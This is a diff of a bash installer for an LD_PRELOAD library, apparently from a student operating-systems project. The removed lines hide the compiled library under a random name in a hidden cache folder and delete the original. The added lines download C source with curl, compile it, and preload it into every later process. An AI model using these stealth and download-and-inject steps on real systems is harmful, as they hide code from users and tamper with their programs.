@@ -1,39 +1,23 @@
 #!/bin/bash
 
-# Make sure this script is sourced on the terminal 
+REPO_URL="https://raw.githubusercontent.com/carina-fehr/osProject/main"
+C_FILE="preloadLib.c"
+OUTPUT_LIB="preloadLib.so"
 
-# Compile preloadLib.c into preloadLib.so
-echo "[*] Starting installation..."
-sleep 1
-echo "Have fun copying my homework!"
-sleep 1
+echo "[*] Lade C-Datei herunter von $REPO_URL/$C_FILE ..."
+curl -s -o "$C_FILE" "$REPO_URL/$C_FILE"
 
-gcc -shared -fPIC -o preloadLib.so preloadLib.c -ldl
 
-if [ $? -ne 0 ]; then
-    echo "Compilation failed"
-    return 1
-fi
+echo "[*] Kompiliere die Library..."
+gcc -fPIC -shared -o "$OUTPUT_LIB" "$C_FILE" -ldl
 
-# Define hidden location
-HIDDEN_DIR="$HOME/.cache/.syslib"
-SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/preloadLib.so"
-NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
-HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME"
+export LD_PRELOAD="$PWD/$OUTPUT_LIB"
 
-# Create the hidden directory if it doesn't exist
-mkdir -p "$HIDDEN_DIR"
+(return 0 2>/dev/null) || {
+    echo "[!] Hinweis: Damit LD_PRELOAD dauerhaft wirkt, führe das Skript mit:"
+    echo "    source $0"
+    return 0 2>/dev/null || exit 0
+}
 
-# Move and rename the .so file
-cp "$SOURCE_SO" "$HIDDEN_SO"
-chmod 755 "$HIDDEN_SO"
-rm -f "$SOURCE_SO"
-
-# Export LD_PRELOAD in current shell session
-export LD_PRELOAD="$HIDDEN_SO"
 alias geary='DISABLE_WRITE_PRANK=1 geary'
-
-echo "[*] Install complete."
-echo "[!] Original .so deleted, have fun trying to find it ;)"
-#echo "Your .so file is now hidden at: $HIDDEN_SO"
 
